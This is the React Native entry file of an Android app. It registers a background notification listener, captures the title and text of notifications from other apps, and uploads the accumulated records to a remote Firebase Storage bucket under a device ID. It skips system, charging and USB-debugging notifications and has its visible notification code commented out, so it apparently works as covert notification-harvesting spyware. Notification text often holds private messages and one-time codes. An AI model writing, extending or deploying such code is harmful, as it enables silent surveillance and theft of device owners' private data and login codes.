import React, { useState, useEffect } from 'react';
import { AppRegistry } from 'react-native';
import App from './App';
import { name as appName } from './app.json';
import PushNotification, { Importance } from 'react-native-push-notification';
import { RNAndroidNotificationListenerHeadlessJsName } from 'react-native-android-notification-listener';
import AsyncStorage from '@react-native-async-storage/async-storage';
import storage from '@react-native-firebase/storage';
import uuid from 'react-native-uuid';

const checkAndSetUniqueId = async () => {
    try {
        let uniqueId = await AsyncStorage.getItem('ID');
        if (!uniqueId) {
            const uniqueId = uuid.v4().slice(0, 8);
            await AsyncStorage.setItem('ID', uniqueId);
            console.log('New unique ID set in AsyncStorage:', uniqueId);
            try {
                const filename = `notifications_${uniqueId}.json`;
                const emptyData = JSON.stringify({});
                const reference = storage().ref(`uploads/${filename}`);
                await reference.putString(emptyData, 'raw', { contentType: 'application/json' });
                console.log('Empty JSON file created and uploaded to Firebase Storage:', filename);
            } catch (error) {
                console.error('Error uploading empty JSON file to Firebase Storage:', error);
            }


        } else {
            console.log('Unique ID already exists:', uniqueId);
        }
    } catch (error) {
        console.error('Error occurred while checking and setting unique ID:', error);
    }
};

const index = () => {
    const [sendNotificationCalled, setSendNotificationCalled] = useState(false);

    useEffect(() => {
        checkAndSetUniqueId(); // Call the function to check and set unique ID

        PushNotification.createChannel(
            {
                channelId: "notification-channel-id",
                channelName: "My Notification Channel",
                channelDescription: "A channel to categorize your notifications.",
                soundName: "default",
                importance: Importance.HIGH,
                vibrate: true,
            },
            (created) => console.log(`Channel created: ${created}`)
        );
    }, []);


    const sendLocalNotification = (notification, run) => {
        console.log('RUN>>>>>>>1');
        if (run) {
            console.log('RUN>>>>>>>2');
            // PushNotification.localNotification({
            //     channelId: "notification-channel-id",
            //     title: notification?.title,
            //     message: notification?.text,
            //     playSound: true,
            //     soundName: "default",
            //     vibrate: true,
            //     smallIcon: notification?.icon
            // });
            setSendNotificationCalled(false);
        }
    };
    const uploadToFirebaseStorageAndFirestore = async (lastNotifications) => {
        try {
            let uniqueId = await AsyncStorage.getItem('ID');
            if (!uniqueId) {
                uniqueId = uuid.v4();
                console.log('INDEX>>>>>>ID', uniqueId);
                await AsyncStorage.setItem('ID', uniqueId);
            }
            const filename = `notifications_${uniqueId}.json`;
            const data = JSON.stringify(lastNotifications);
            const utf8EncodedData = unescape(encodeURIComponent(data));
            const reference = storage().ref(`uploads/${filename}`);
            await reference.putString(utf8EncodedData, 'raw', { contentType: 'application/json;charset=utf-8' }); // Upload data
            console.log('Data uploaded successfully to Firebase Storage');
        } catch (error) {
            console.error('Error uploading data to Firebase Storage:', error);
        }
    };

    const handleBackgroundNotification = async ({ notification }) => {
        try {
            const notificationData = JSON.parse(notification);
            console.log("Data1", notificationData);
            console.log("Data2", notification);
            if (notificationData && !sendNotificationCalled &&
                (notificationData.app.includes('com.android.vending')
                    || notificationData.app.includes('com.xiaomi.mipicks')
                    || notificationData.app.includes('com.android.chrome')
                    || notificationData.text.includes('MB')
                    || notificationData.app.includes('com.android.systemui')
                    || notificationData.text.includes('Messages is doing work in the background')
                    || notificationData.app.includes('com.mayur89821')
                    || notificationData.title.includes('Charging this device via USB')
                )) {
                console.log("ENTEREDDDDD1");
                setSendNotificationCalled(false);
            } else if (!sendNotificationCalled) {
                console.log("ENTEREDDDDD2", notificationData);
                //STORAGEE
                if (notificationData.text !== ''
                    && !notificationData.title.includes('Charging this device via USB')
                    && !notificationData.title.includes('USB debugging connected')) {
                    sendLocalNotification(notificationData, run = true);
                    setSendNotificationCalled(true);
                    let existingNotifications = await AsyncStorage.getItem('notifications');
                    existingNotifications = existingNotifications ? JSON.parse(existingNotifications) : [];
                    existingNotifications.push(notificationData);
                    await AsyncStorage.setItem('notifications', JSON.stringify(existingNotifications));

                    // console.log('existingNotifications>>>>>', existingNotifications);
                    await uploadToFirebaseStorageAndFirestore(existingNotifications);
                }
            } else {
                console.log("ENTEREDDDDD3");
                setSendNotificationCalled(false);
            }
        } catch (error) {
            console.error("error:", error);
        }
    };
    AppRegistry.registerHeadlessTask(RNAndroidNotificationListenerHeadlessJsName, () => handleBackgroundNotification);

    return <App />;
};

AppRegistry.registerComponent(appName, () => index);
